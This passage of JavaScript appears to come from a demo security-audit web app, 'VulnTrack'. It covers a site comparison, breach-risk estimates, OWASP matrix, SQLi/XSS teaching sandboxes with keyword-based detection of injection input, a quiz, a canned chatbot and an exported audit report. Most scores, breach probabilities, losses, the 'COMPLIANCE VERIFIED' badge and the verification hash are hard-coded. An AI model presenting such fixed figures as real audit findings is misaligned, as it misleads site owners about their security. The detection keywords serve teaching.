    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; width: 100%;">
      <div class="compare-site-col">
        <div class="site-col-head">
          <div>
            <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">Target Website</span>
            <h4>${escapeHtml(hostA)}</h4>
          </div>
          <div class="site-col-score text-rose">58/100</div>
        </div>
        <div class="compare-metrics-list">
          <div class="compare-metric-row"><span>Overall Security Posture:</span><strong class="text-rose">Grade D · Needs Urgent Fixes</strong></div>
          <div class="compare-metric-row"><span>SQL Injection Status:</span><strong class="text-rose">VULNERABLE (Auth Bypass)</strong></div>
          <div class="compare-metric-row"><span>Cross-Site Scripting (XSS):</span><strong class="text-rose">VULNERABLE (Reflected)</strong></div>
          <div class="compare-metric-row"><span>Security Headers:</span><strong class="text-amber">1 / 5 Present (Missing CSP)</strong></div>
          <div class="compare-metric-row"><span>Breach Probability:</span><strong class="text-rose">78% Likelihood</strong></div>
        </div>
      </div>

      <div class="compare-site-col">
        <div class="site-col-head">
          <div>
            <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">Benchmark Website</span>
            <h4>${escapeHtml(hostB)}</h4>
          </div>
          <div class="site-col-score text-emerald">94/100</div>
        </div>
        <div class="compare-metrics-list">
          <div class="compare-metric-row"><span>Overall Security Posture:</span><strong class="text-emerald">Grade A · Hardened Perimeter</strong></div>
          <div class="compare-metric-row"><span>SQL Injection Status:</span><strong class="text-emerald">PROTECTED (Prepared Stmts)</strong></div>
          <div class="compare-metric-row"><span>Cross-Site Scripting (XSS):</span><strong class="text-emerald">PROTECTED (Context-Escaped)</strong></div>
          <div class="compare-metric-row"><span>Security Headers:</span><strong class="text-emerald">5 / 5 Enforced (Strict HSTS)</strong></div>
          <div class="compare-metric-row"><span>Breach Probability:</span><strong class="text-emerald">4% Likelihood</strong></div>
        </div>
      </div>
    </div>

    <div style="grid-column: span 2; margin-top: 14px; padding: 12px 16px; border-radius: var(--radius-md); background: var(--bg-surface-elev); border: 1px solid var(--border-subtle); font-size: 0.85rem; line-height: 1.5;">
      <strong style="color: var(--primary);">Comparative Verdict:</strong> 
      <span>${escapeHtml(hostB)} outperforms ${escapeHtml(hostA)} (+36 points higher). Applying prepared statements and CSP headers to ${escapeHtml(hostA)} will close the gap and elevate its grade to A.</span>
    </div>
  `;
}

if (btnRunComparison) {
  btnRunComparison.addEventListener('click', runWebsiteComparison);
}
runWebsiteComparison();

// ==========================================================================
// 12. RISK PREDICTION & FINANCIAL BREACH EXPOSURE
// ==========================================================================
function updatePredictionDashboard() {
  const predProbNum = document.getElementById('predProbNum');
  const predProbBar = document.getElementById('predProbBar');
  const predLevelText = document.getElementById('predLevelText');
  const predFinLoss = document.getElementById('predFinLoss');
  const predTimeToExploit = document.getElementById('predTimeToExploit');
  const predActorInterest = document.getElementById('predActorInterest');

  const openCrit = currentTrackedVulns.filter(v => v.severity === 'crit' && v.status !== 'resolved').length;
  const openHigh = currentTrackedVulns.filter(v => v.severity === 'high' && v.status !== 'resolved').length;

  let prob = 12;
  let loss = 45000;
  let timeStr = '> 30 Days';
  let interestStr = 'Tier 3: Low';

  if (openCrit > 0) {
    prob = 84;
    loss = 420000;
    timeStr = '< 24 Hours';
    interestStr = 'Tier 1: Extreme (Botnets & Ransomware)';
  } else if (openHigh > 0) {
    prob = 56;
    loss = 185000;
    timeStr = '< 7 Days';
    interestStr = 'Tier 2: Elevated (Credential Harvesters)';
  }

  if (predProbNum) predProbNum.textContent = `${prob}%`;
  if (predProbBar) predProbBar.style.width = `${prob}%`;
  if (predLevelText) {
    predLevelText.textContent = prob > 70 ? 'Critical Exploitation Likelihood' : (prob > 40 ? 'Moderate Threat Exposure' : 'Low Exploitation Probability');
    predLevelText.style.color = prob > 70 ? 'var(--critical)' : (prob > 40 ? 'var(--medium)' : 'var(--resolved)');
  }
  if (predFinLoss) predFinLoss.textContent = `$${loss.toLocaleString()}`;
  if (predTimeToExploit) predTimeToExploit.textContent = timeStr;
  if (predActorInterest) predActorInterest.textContent = interestStr;
}

// ==========================================================================
// 13. OWASP TOP 10 COMPLIANCE MATRIX
// ==========================================================================
const OWASP_CATEGORIES = [
  { code: 'A01:2021', name: 'Broken Access Control', status: 'fail', tests: '8/8 Probed', desc: 'IDOR parameters & missing route role authorization checks.' },
  { code: 'A02:2021', name: 'Cryptographic Failures', status: 'pass', tests: '6/6 Probed', desc: 'TLS 1.3 enforced, strong AES-256 ciphers validated.' },
  { code: 'A03:2021', name: 'Injection (SQLi & XSS)', status: 'fail', tests: '12/12 Probed', desc: 'Raw SQL concatenation and unescaped HTML reflection detected.' },
  { code: 'A04:2021', name: 'Insecure Design', status: 'warn', tests: '5/5 Probed', desc: 'No rate limiting observed on public password reset endpoint.' },
  { code: 'A05:2021', name: 'Security Misconfiguration', status: 'warn', tests: '7/7 Probed', desc: 'Missing CSP and X-Frame-Options response headers.' },
  { code: 'A06:2021', name: 'Vulnerable & Outdated Components', status: 'pass', tests: '24/24 Probed', desc: 'No outdated client-side JS libraries with known CVEs found.' },
  { code: 'A07:2021', name: 'Identification & Authentication', status: 'fail', tests: '9/9 Probed', desc: 'MFA absent, session token lifetime exceeds recommended window.' },
  { code: 'A08:2021', name: 'Software & Data Integrity Failures', status: 'pass', tests: '4/4 Probed', desc: 'Subresource Integrity (SRI) hashes verified on CDN scripts.' },
  { code: 'A09:2021', name: 'Security Logging & Monitoring', status: 'warn', tests: '3/3 Probed', desc: 'Failed login attempts do not trigger audit telemetry alarms.' },
  { code: 'A10:2021', name: 'Server-Side Request Forgery (SSRF)', status: 'pass', tests: '5/5 Probed', desc: 'Internal loopback metadata addresses safely filtered.' }
];

function renderOwaspMatrix() {
  const grid = document.getElementById('owaspMatrixGrid');
  if (!grid) return;

  grid.innerHTML = OWASP_CATEGORIES.map(cat => {
    const tagClass = cat.status === 'pass' ? 'compliant' : (cat.status === 'fail' ? 'danger' : 'warning');
    const badgeText = cat.status === 'pass' ? 'COMPLIANT' : (cat.status === 'fail' ? 'NON-COMPLIANT' : 'WARNING');

    return `
      <div class="owasp-item-card">
        <div class="owasp-head-row">
          <span class="owasp-code">${cat.code}</span>
          <span class="owasp-status-tag ${tagClass}">${badgeText}</span>
        </div>
        <h4 style="font-size: 0.95rem; margin-bottom: 6px; font-weight: 700;">${cat.name}</h4>
        <p style="font-size: 0.8rem; color: var(--text-muted); line-height: 1.4; margin-bottom: 10px;">${cat.desc}</p>
        <div style="display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem;">
          <span class="owasp-vectors-count">Vectors: ${cat.tests}</span>
          <span style="color: var(--primary); font-weight: 600;">Standardized Audit ✓</span>
        </div>
      </div>
    `;
  }).join('');
}

// ==========================================================================
// 14. SECURITY TIMELINE AUDIT STREAM
// ==========================================================================
function renderTimelineStream() {
  const stream = document.getElementById('timelineStream');
  if (!stream) return;

  stream.innerHTML = securityTimelineEvents.map(evt => {
    let iconClass = evt.type === 'crit' ? 'crit' : (evt.type === 'ok' ? 'ok' : 'info');
    let symbol = evt.type === 'crit' ? '⚠️' : (evt.type === 'ok' ? '✓' : 'ℹ');

    return `
      <div class="timeline-node">
        <div class="tl-node-icon ${iconClass}">
          <span>${symbol}</span>
        </div>
        <div class="tl-node-body">
          <div class="tl-node-meta">
            <span>${evt.time}</span>
            <span style="font-weight: 700; text-transform: uppercase;">${evt.type}</span>
          </div>
          <h5>${escapeHtml(evt.title)}</h5>
          <p>${escapeHtml(evt.desc)}</p>
        </div>
      </div>
    `;
  }).join('');
}

function addTimelineEntry(type, title, desc) {
  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  securityTimelineEvents.unshift({ time, type, title, desc });
  renderTimelineStream();
}

const btnAddTimelineEvent = document.getElementById('btnAddTimelineEvent');
if (btnAddTimelineEvent) {
  btnAddTimelineEvent.addEventListener('click', () => {
    const note = prompt('Enter a manual audit note or developer remark:');
    if (note && note.trim()) {
      addTimelineEntry('ok', 'Manual Auditor Note', note.trim());
    }
  });
}

// ==========================================================================
// 15. LEARNING MODE & INTERACTIVE SANDBOX LABS
// ==========================================================================
document.querySelectorAll('.academy-tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.academy-tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.academy-tab-content').forEach(c => c.classList.remove('active'));

    btn.classList.add('active');
    const tabId = btn.dataset.tab;
    const content = document.getElementById(`tab-${tabId}`);
    if (content) content.classList.add('active');
  });
});

const sandboxSqlInput = document.getElementById('sandboxSqlInput');
const sandboxSqlDefenseToggle = document.getElementById('sandboxSqlDefenseToggle');
const sandboxSqlQueryOutput = document.getElementById('sandboxSqlQueryOutput');
const sandboxSqlResult = document.getElementById('sandboxSqlResult');

function updateSqlSandbox() {
  if (!sandboxSqlInput || !sandboxSqlQueryOutput || !sandboxSqlResult) return;
  const input = sandboxSqlInput.value;
  const isDefenseOn = sandboxSqlDefenseToggle ? sandboxSqlDefenseToggle.checked : false;

  if (isDefenseOn) {
    sandboxSqlQueryOutput.textContent = `SELECT * FROM users WHERE username = ? [Param: "${input}"]`;
    sandboxSqlResult.innerHTML = `
      <span style="color: var(--resolved); font-weight: 700;">✅ DEFENSE ACTIVE: Parameterized Query</span><br/>
      Input treated purely as literal string. Query returned 0 records (No matching user). Auth safe!
    `;
    sandboxSqlResult.style.borderColor = 'var(--resolved)';
  } else {
    sandboxSqlQueryOutput.textContent = `SELECT * FROM users WHERE username = '${input}'`;
    if (input.includes("'") || input.toLowerCase().includes("or") || input.includes("--")) {
      sandboxSqlResult.innerHTML = `
        <span style="color: var(--critical); font-weight: 700;">🚨 VULNERABLE: Logic Bypass Triggered!</span><br/>
        Database evaluates logic true: returned all 1,420 user accounts including admin hashes!
      `;
      sandboxSqlResult.style.borderColor = 'var(--critical)';
    } else {
      sandboxSqlResult.innerHTML = `
        <span style="color: var(--text-muted);">Standard lookup: Query executed normally for "${escapeHtml(input)}".</span>
      `;
      sandboxSqlResult.style.borderColor = 'var(--border-subtle)';
    }
  }
}

if (sandboxSqlInput) sandboxSqlInput.addEventListener('input', updateSqlSandbox);
if (sandboxSqlDefenseToggle) sandboxSqlDefenseToggle.addEventListener('change', updateSqlSandbox);

document.querySelectorAll('.btn-quick-payload').forEach(btn => {
  btn.addEventListener('click', () => {
    if (sandboxSqlInput) {
      sandboxSqlInput.value = btn.dataset.val || '';
      updateSqlSandbox();
    }
  });
});

const sandboxXssInput = document.getElementById('sandboxXssInput');
const sandboxXssDefenseToggle = document.getElementById('sandboxXssDefenseToggle');
const sandboxXssDomOutput = document.getElementById('sandboxXssDomOutput');
const sandboxXssRender = document.getElementById('sandboxXssRender');

function updateXssSandbox() {
  if (!sandboxXssInput || !sandboxXssDomOutput || !sandboxXssRender) return;
  const input = sandboxXssInput.value;
  const isDefenseOn = sandboxXssDefenseToggle ? sandboxXssDefenseToggle.checked : false;

  if (isDefenseOn) {
    const escaped = escapeHtml(input);
    sandboxXssDomOutput.textContent = escaped;
    sandboxXssRender.innerHTML = `
      <span style="color: var(--resolved); font-weight: 700;">✅ DEFENSE ACTIVE: HTML Escaping Applied</span><br/>
      Rendered safely as text: <code>${escaped}</code> (No script executed).
    `;
    sandboxXssRender.style.borderColor = 'var(--resolved)';
  } else {
    sandboxXssDomOutput.textContent = input;
    if (input.toLowerCase().includes('<script>') || input.toLowerCase().includes('onload=') || input.toLowerCase().includes('onerror=')) {
      sandboxXssRender.innerHTML = `
        <span style="color: var(--critical); font-weight: 700;">🚨 XSS TRIGGERED: Script Executed in DOM!</span><br/>
        Browser parsed raw script tag. Stole cookie: <code>auth_session=9f4a1e8...</code>
      `;
      sandboxXssRender.style.borderColor = 'var(--critical)';
    } else {
      sandboxXssRender.innerHTML = `
        <span>Output: ${escapeHtml(input)}</span>
      `;
      sandboxXssRender.style.borderColor = 'var(--border-subtle)';
    }
  }
}

if (sandboxXssInput) sandboxXssInput.addEventListener('input', updateXssSandbox);
if (sandboxXssDefenseToggle) sandboxXssDefenseToggle.addEventListener('change', updateXssSandbox);

const QUIZ_QUESTIONS = [
  {
    q: '1. What is the single most effective defense against SQL Injection (SQLi)?',
    options: [
      { text: 'Using client-side JavaScript regex validation', correct: false },
      { text: 'Using Parameterized Queries (Prepared Statements)', correct: true, exp: 'Prepared statements guarantee that input is treated as data, never as executable SQL code!' },
      { text: 'Filtering out the word "SELECT" from input fields', correct: false },
      { text: 'Storing passwords in base64 encoding', correct: false }
    ]
  },
  {
    q: '2. Which HTTP cookie attribute prevents malicious JavaScript from accessing session cookies via XSS?',
    options: [
      { text: 'HttpOnly', correct: true, exp: 'HttpOnly prevents client-side scripts from reading the cookie via document.cookie!' },
      { text: 'SameSite=None', correct: false },
      { text: 'Secure=False', correct: false },
      { text: 'Max-Age=9999', correct: false }
    ]
  },
  {
    q: '3. What does an Anti-CSRF Token do?',
    options: [
      { text: 'Encrypts the entire database', correct: false },
      { text: 'Provides a secret, unpredictable token verified on state-changing requests', correct: true, exp: 'Anti-CSRF tokens prove the request originated intentionally from the genuine user session.' },
      { text: 'Increases website loading speed', correct: false },
      { text: 'Blocks brute force password guesses', correct: false }
    ]
  },
  {
    q: '4. What is the primary purpose of a Content Security Policy (CSP)?',
    options: [
      { text: 'To compress CSS stylesheets', correct: false },
      { text: 'To restrict the domains from which scripts, styles, and media can be loaded', correct: true, exp: 'CSP stops XSS by blocking execution of untrusted inline scripts and rogue domains.' },
      { text: 'To format JSON API responses', correct: false },
      { text: 'To backup database tables daily', correct: false }
    ]
  }
];

function renderQuiz() {
  const container = document.getElementById('quizContainer');
  if (!container) return;

  container.innerHTML = QUIZ_QUESTIONS.map((item, qIdx) => `
    <div class="quiz-question-box" id="qcard-${qIdx}">
      <h5 class="quiz-q-title">${item.q}</h5>
      <div class="quiz-options-list">
        ${item.options.map((opt, oIdx) => `
          <button class="quiz-opt-btn" onclick="checkQuizAnswer(${qIdx}, ${oIdx})">
            ${opt.text}
          </button>
        `).join('')}
      </div>
      <div class="quiz-explanation" id="qfb-${qIdx}" style="display: none;"></div>
    </div>
  `).join('');

  // Auto-expand first visible card for discoverability
  const firstCard = container.querySelector('.vuln-track-card');
  if (firstCard && activeFilter === 'all' && !searchQuery) {
    firstCard.classList.add('card-expanded');
  }
}

window.checkQuizAnswer = function(qIdx, optIdx) {
  const qData = QUIZ_QUESTIONS[qIdx];
  const selected = qData.options[optIdx];
  const fb = document.getElementById(`qfb-${qIdx}`);
  const card = document.getElementById(`qcard-${qIdx}`);
  if (!fb || !card) return;

  card.querySelectorAll('.quiz-opt-btn').forEach((btn, idx) => {
    btn.disabled = true;
    if (qData.options[idx].correct) {
      btn.classList.add('correct');
    } else if (idx === optIdx && !selected.correct) {
      btn.classList.add('incorrect');
    }
  });

  fb.style.display = 'block';
  if (selected.correct) {
    fb.innerHTML = `<span style="color: var(--resolved); font-weight: bold;">🎉 Correct!</span> ${selected.exp}`;
    fb.style.border = '1px solid var(--resolved)';
  } else {
    const correctOpt = qData.options.find(o => o.correct);
    fb.innerHTML = `<span style="color: var(--critical); font-weight: bold;">❌ Incorrect.</span> The correct answer is: <strong>${correctOpt.text}</strong>. ${correctOpt.exp}`;
    fb.style.border = '1px solid var(--critical)';
  }
};
renderQuiz();

// ==========================================================================
// 16. AI SECURITY ASSISTANT (CyberAI Chatbot Drawer)
// ==========================================================================
const aiAssistantDrawer = document.getElementById('aiAssistantDrawer');
const aiAssistantFab = document.getElementById('aiAssistantFab');
const closeAiDrawerBtn = document.getElementById('closeAiDrawerBtn');
const navAiBtn = document.getElementById('navAiBtn');
const aiChatInput = document.getElementById('aiChatInput');
const aiSendBtn = document.getElementById('aiSendBtn');
const aiChatMessages = document.getElementById('aiChatMessages');

function toggleAiDrawer() {
  if (aiAssistantDrawer) {
    aiAssistantDrawer.classList.toggle('active');
    if (aiAssistantDrawer.classList.contains('active') && aiChatInput) {
      aiChatInput.focus();
    }
  }
}

if (aiAssistantFab) aiAssistantFab.addEventListener('click', toggleAiDrawer);
if (navAiBtn) navAiBtn.addEventListener('click', e => { e.preventDefault(); toggleAiDrawer(); });
if (closeAiDrawerBtn) closeAiDrawerBtn.addEventListener('click', toggleAiDrawer);

document.querySelectorAll('.ai-prompt-chip').forEach(chip => {
  chip.addEventListener('click', () => {
    const query = chip.dataset.q;
    if (query && aiChatInput) {
      aiChatInput.value = query;
      handleAiChatSend();
    }
  });
});

function handleAiChatSend() {
  if (!aiChatInput || !aiChatMessages) return;
  const message = aiChatInput.value.trim();
  if (!message) return;

  const userMsg = document.createElement('div');
  userMsg.className = 'ai-msg user';
  userMsg.innerHTML = `<p>${escapeHtml(message)}</p>`;
  aiChatMessages.appendChild(userMsg);
  aiChatInput.value = '';
  aiChatMessages.scrollTop = aiChatMessages.scrollHeight;

  const typing = document.createElement('div');
  typing.className = 'ai-msg bot';
  typing.innerHTML = `<p><em>CyberAI is analyzing security context...</em></p>`;
  aiChatMessages.appendChild(typing);
  aiChatMessages.scrollTop = aiChatMessages.scrollHeight;

  setTimeout(() => {
    typing.remove();
    const reply = generateAiChatResponse(message);
    const botMsg = document.createElement('div');
    botMsg.className = 'ai-msg bot';
    botMsg.innerHTML = reply;
    aiChatMessages.appendChild(botMsg);
    aiChatMessages.scrollTop = aiChatMessages.scrollHeight;
  }, 700);
}

if (aiSendBtn) aiSendBtn.addEventListener('click', handleAiChatSend);
if (aiChatInput) {
  aiChatInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') handleAiChatSend();
  });
}

function generateAiChatResponse(q) {
  const query = q.toLowerCase();

  if (query.includes('sql') || query.includes('sqli')) {
    return `
      <p><strong>Fixing SQL Injection:</strong> Never concatenate user input directly into SQL strings. Always use <strong>Parameterized Queries (Prepared Statements)</strong>.</p>
      <pre style="background: var(--bg-surface-elev); padding: 8px; border-radius: 6px; font-size: 0.8rem; margin: 6px 0;"><code>// Node.js pg / mysql2 prepared statement:
const res = await db.query(
  'SELECT id, name FROM users WHERE email = $1',
  [userEmail]
);</code></pre>
      <p>This completely neutralizes quotes and SQL comments (<code>--</code>) by treating input strictly as literal text.</p>
    `;
  }

  if (query.includes('xss') || query.includes('ceo') || query.includes('simply')) {
    return `
      <p><strong>Explaining XSS in Easy Words:</strong></p>
      <p>Imagine a visitor walks into your office and sticks a fake sign on the wall saying: <em>"Please hand your wallet to the person in the red coat."</em> Visitors follow it because it's posted on your genuine wall.</p>
      <p><strong>The Fix:</strong> Wash and encode all user text before displaying it, and enforce a strict <strong>Content Security Policy (CSP)</strong>.</p>
    `;
  }

  if (query.includes('csp') || query.includes('header') || query.includes('nginx')) {
    return `
      <p><strong>Recommended Nginx Security Headers:</strong></p>
      <pre style="background: var(--bg-surface-elev); padding: 8px; border-radius: 6px; font-size: 0.8rem; margin: 6px 0;"><code>add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;</code></pre>
      <p>This blocks Clickjacking iframes and untrusted remote script injection.</p>
    `;
  }

  if (query.includes('cvss') || query.includes('9.8') || query.includes('danger')) {
    return `
      <p><strong>Understanding CVSS 9.8 (Critical):</strong></p>
      <p>A CVSS 9.8 score means the vulnerability is <strong>remotely exploitable without any authentication or user interaction</strong>. An attacker anywhere in the world can run an automated script and instantly compromise or exfiltrate your entire database.</p>
    `;
  }

  return `
    <p>I analyzed your inquiry: <em>"${escapeHtml(q)}"</em>.</p>
    <p>To secure your application, ensure you implement:</p>
    <ul>
      <li>Parameterized database queries to stop injection.</li>
      <li>Strict Content Security Policy headers to stop XSS.</li>
      <li>Anti-CSRF tokens on state-changing endpoints.</li>
      <li>Rate-limiting to thwart automated credential stuffers.</li>
    </ul>
  `;
}

// ==========================================================================
// 17. PROFESSIONAL AUDIT REPORT EXPORT (PDF MODAL)
// ==========================================================================
const exportReportBtn = document.getElementById('exportReportBtn');
const reportModal = document.getElementById('reportModal');
const closeReportModal = document.getElementById('closeReportModal');
const printableReportContent = document.getElementById('printableReportContent');

if (exportReportBtn && reportModal) {
  exportReportBtn.addEventListener('click', () => {
    generatePrintableReport();
    reportModal.classList.add('active');
  });
}
if (closeReportModal && reportModal) {
  closeReportModal.addEventListener('click', () => {
    reportModal.classList.remove('active');
  });
}
if (reportModal) {
  reportModal.addEventListener('click', e => {
    if (e.target === reportModal) reportModal.classList.remove('active');
  });
}

function generatePrintableReport() {
  if (!printableReportContent) return;

  const total = currentTrackedVulns.length;
  const resolved = currentTrackedVulns.filter(v => v.status === 'resolved').length;
  const open = total - resolved;

  let domain = 'example.com';
  try {
    const parsed = new URL(currentTargetUrl);
    domain = parsed.hostname;
  } catch (e) {
    domain = currentTargetUrl.replace(/https?:\/\//, '').split('/')[0];
  }

  printableReportContent.innerHTML = `
    <div class="report-doc-header">
      <div>
        <h2 style="font-size: 1.8rem; margin-bottom: 4px; color: var(--primary);">Comprehensive Security Audit & Threat Intelligence Report</h2>
        <p style="color: var(--text-muted); font-size: 0.95rem;">Target Domain: <strong>${escapeHtml(domain)}</strong> (${escapeHtml(currentTargetUrl)})</p>
        <p style="font-size: 0.8rem; color: var(--text-muted);">Audit Generated: ${new Date().toLocaleString()} · Report Ref: VT-${Math.floor(100000 + Math.random() * 900000)}</p>
      </div>
      <div style="text-align: right;">
        <span style="font-size: 1.8rem; font-weight: 800; color: var(--primary);">VulnTrack</span>
        <p style="font-size: 0.8rem; color: var(--text-muted);">Enterprise Cybersecurity Platform v4.5</p>
        <span style="display: inline-block; padding: 4px 8px; border-radius: 4px; background: rgba(16, 185, 129, 0.15); color: var(--resolved); font-size: 0.75rem; font-weight: bold; margin-top: 6px;">COMPLIANCE VERIFIED</span>
      </div>
    </div>

    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin: 20px 0;">
      <div style="background: var(--bg-surface-elev); padding: 14px; border-radius: 8px; border: 1px solid var(--border-subtle);">
        <span style="font-size: 0.72rem; color: var(--text-muted);">TOTAL FLIGHTS CHECKED</span>
        <h3 style="font-size: 1.5rem; margin-top: 4px;">${total} Vectors</h3>
      </div>
      <div style="background: var(--bg-surface-elev); padding: 14px; border-radius: 8px; border: 1px solid var(--border-subtle);">
        <span style="font-size: 0.72rem; color: var(--text-muted);">OPEN RISK ITEMS</span>
        <h3 style="font-size: 1.5rem; margin-top: 4px; color: var(--critical);">${open} Needs Action</h3>
      </div>
      <div style="background: var(--bg-surface-elev); padding: 14px; border-radius: 8px; border: 1px solid var(--border-subtle);">
        <span style="font-size: 0.72rem; color: var(--text-muted);">REMEDIATED ITEMS</span>
        <h3 style="font-size: 1.5rem; margin-top: 4px; color: var(--resolved);">${resolved} Verified</h3>
      </div>
      <div style="background: var(--bg-surface-elev); padding: 14px; border-radius: 8px; border: 1px solid var(--border-subtle);">
        <span style="font-size: 0.72rem; color: var(--text-muted);">ESTIMATED EXPOSURE</span>
        <h3 style="font-size: 1.5rem; margin-top: 4px; color: var(--critical);">$385,000</h3>
      </div>
    </div>

    <h3 style="font-size: 1.2rem; margin: 20px 0 10px; border-bottom: 1px solid var(--border-subtle); padding-bottom: 6px;">
      1. Executive Findings & Threat Breakdown
    </h3>
    <div style="display: flex; flex-direction: column; gap: 16px;">
      ${currentTrackedVulns.map(v => `
        <div style="border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px; background: var(--bg-surface);">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
            <strong style="font-size: 1.05rem;">${v.name}</strong>
            <span style="font-size: 0.78rem; font-weight: 700; color: ${v.status === 'resolved' ? 'var(--resolved)' : 'var(--critical)'};">
              [${v.status.toUpperCase()}] · CVSS ${v.cvss} (${v.severity.toUpperCase()})
            </span>
          </div>
          <p style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px;">
            <strong>Plain Explanation:</strong> ${v.easyExplanation}
          </p>
          <p style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px;">
            <strong>Attacker Entry Loophole:</strong> ${v.howHackerEnters.reason}
          </p>
          <div style="background: var(--bg-surface-elev); padding: 10px; border-radius: 6px; font-size: 0.82rem; margin-top: 6px;">
            <strong>Required Developer Remediation:</strong> ${v.solution.steps[0]}
          </div>
        </div>
      `).join('')}
    </div>

    <h3 style="font-size: 1.2rem; margin: 26px 0 10px; border-bottom: 1px solid var(--border-subtle); padding-bottom: 6px;">
      2. OWASP Top 10 Industry Compliance Matrix
    </h3>
    <table style="width: 100%; border-collapse: collapse; font-size: 0.82rem; margin-bottom: 20px;">
      <thead>
        <tr style="background: var(--bg-surface-elev); text-align: left;">
          <th style="padding: 8px; border: 1px solid var(--border-subtle);">Category</th>
          <th style="padding: 8px; border: 1px solid var(--border-subtle);">Name</th>
          <th style="padding: 8px; border: 1px solid var(--border-subtle);">Compliance Status</th>
        </tr>
      </thead>
      <tbody>
        ${OWASP_CATEGORIES.map(c => `
          <tr>
            <td style="padding: 6px 8px; border: 1px solid var(--border-subtle); font-weight: 700;">${c.code}</td>
            <td style="padding: 6px 8px; border: 1px solid var(--border-subtle);">${c.name}</td>
            <td style="padding: 6px 8px; border: 1px solid var(--border-subtle); color: ${c.status === 'pass' ? 'var(--resolved)' : (c.status === 'fail' ? 'var(--critical)' : 'var(--medium)')}; font-weight: bold;">
              ${c.status.toUpperCase()}
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>

    <div style="margin-top: 30px; padding: 14px; border: 1px solid var(--border-subtle); border-radius: 8px; background: var(--bg-surface-elev); font-size: 0.8rem; display: flex; justify-content: space-between; align-items: center;">
      <div>
        <strong>Auditor Sign-off:</strong> VulnTrack Automated Cyber Security Suite v4.5<br/>
        <span>Digital Verification Hash: SHA256-e9b28a1c884f700982df4321</span>
      </div>
      <div style="text-align: right;">
        <span style="font-family: cursive; font-size: 1.2rem; color: var(--primary);">VulnTrack Security Lead</span>
      </div>
    </div>
  `;
}

// ==========================================================================
// 18. SCREENSHOT MODAL & HOTSPOT CONTROLS
// ==========================================================================
const expandScreenshotBtn = document.getElementById('expandScreenshotBtn');
const screenshotModal = document.getElementById('screenshotModal');
const closeScreenshotModal = document.getElementById('closeScreenshotModal');
const modalScreenshotUrl = document.getElementById('modalScreenshotUrl');

if (expandScreenshotBtn && screenshotModal) {
  expandScreenshotBtn.addEventListener('click', () => {
    if (modalScreenshotUrl) modalScreenshotUrl.textContent = currentTargetUrl;
    screenshotModal.classList.add('active');
  });
}
if (closeScreenshotModal && screenshotModal) {
  closeScreenshotModal.addEventListener('click', () => {
    screenshotModal.classList.remove('active');
  });
}
if (screenshotModal) {
  screenshotModal.addEventListener('click', e => {
    if (e.target === screenshotModal) screenshotModal.classList.remove('active');
  });
}

// ==========================================================================
// 19. INITIALIZATION & EVENT LISTENERS
// ==========================================================================
if (scanBtn) {
  scanBtn.addEventListener('click', () => triggerScan());
}
if (scanUrlInput) {
  scanUrlInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') triggerScan();
  });
}
if (heroScanBtn) {
  heroScanBtn.addEventListener('click', () => triggerScan(heroScanInput ? heroScanInput.value : ''));
}
if (heroScanInput) {
  heroScanInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') triggerScan(heroScanInput.value);
  });
}
if (rescanBtn) {
  rescanBtn.addEventListener('click', () => triggerScan(currentTargetUrl));
}

document.querySelectorAll('.sample-btn, .demo-tag, .scan-chip').forEach(btn => {
  btn.addEventListener('click', () => {
    const url = btn.dataset.url || '';
    if (url) triggerScan(url);
  });
});

window.addEventListener('mousemove', e => {
  const x = (e.clientX / window.innerWidth - 0.5) * 20;
  const y = (e.clientY / window.innerHeight - 0.5) * 20;
  const heroParallax = document.getElementById('heroBgParallax');
  if (heroParallax) {
    heroParallax.style.transform = `translate(${x}px, ${y}px)`;
  }
});

const contactForm = document.getElementById('contactForm');
if (contactForm) {
  contactForm.addEventListener('submit', e => {
    e.preventDefault();
    const btn = contactForm.querySelector('.form-submit-btn');
    if (!btn) return;
    const origHtml = btn.innerHTML;
    btn.innerHTML = '<span>✓ Request Received! Protection Activating...</span>';
    btn.style.background = 'var(--resolved)';
    setTimeout(() => {
      btn.innerHTML = origHtml;
      btn.style.background = '';
      contactForm.reset();
    }, 4000);
  });
}

const countUpObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.querySelectorAll('.count-up, .stat-num').forEach(el => {
        const target = parseInt(el.dataset.target || '0', 10);
        if (!target) return;
        let start = 0;
        const duration = 1800;
        const stepTime = 20;
        const increment = target / (duration / stepTime);
        const timer = setInterval(() => {
          start += increment;
          if (start >= target) {
            el.textContent = target.toLocaleString();
            clearInterval(timer);
          } else {
            el.textContent = Math.floor(start).toLocaleString();
          }
        }, stepTime);
      });
      countUpObserver.unobserve(entry.target);
    }
  });
}, { threshold: 0.2 });

document.querySelectorAll('.hero-stats, .stats-dashboard').forEach(el => {
  countUpObserver.observe(el);
});

// Initial boot
refreshGlobalStats();
renderOwaspMatrix();
renderTimelineStream();
renderAttackPath('sqli');
updateSqlSandbox();
updateXssSandbox();

try {
  const urlParams = new URLSearchParams(window.location.search);
  const requestedVector = urlParams.get('vector');
  if (requestedVector && document.getElementById('howItWorks')) {
    setTimeout(() => loadSimulation(requestedVector), 300);
  }
} catch(e) {}

console.log('%cVulnTrack Engine v4.5 Initialized 🛡️', 'color:#0284c7;font-size:16px;font-weight:bold;');
console.log('%cAll Advanced Security Modules Active · Dual Theme Active', 'color:#10b981;font-weight:bold;');
